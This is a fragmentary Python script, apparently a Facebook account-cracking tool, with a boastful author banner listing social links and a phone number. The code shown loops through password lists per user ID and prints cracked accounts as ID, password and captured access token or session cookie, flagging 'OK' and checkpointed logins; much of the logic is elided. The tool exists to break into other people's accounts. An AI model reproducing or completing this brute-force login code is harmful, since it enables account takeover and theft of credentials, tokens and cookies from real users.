...
\x1b[0;33m║WELCOME TO MY TOOLS  [AWAIS].  ║

\x1b[0;33m║       #TOOL AUTHOR [AWAIS MOMAND] MAFIA BOSS. ║
...
\x1b[0;33m║#YOUTUBE : https://youtube.com/TECHNICAL AWAIS.  ║

\x1b[0;33m║#FACEBOOK : NAME [AWAIS KHANI  II ].       ║

\x1b[0;33m║#GITHUB : https://github.com/awaismoman.   ║

\x1b[0;33m║#WHATSAPP : +923173725015.                   ║
...
def menu():
	...
	elif Bilal == "1" or AWAIS == "01":

		publik()

		method()

	elif Bilal == "2" or AWAIS == "02":
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[AWAIS-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[AWAIS-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;95m[AWAIS-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[AWAIS-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[AWAIS-CP] %s|%s\033[0;91m        "%(uid, pw))
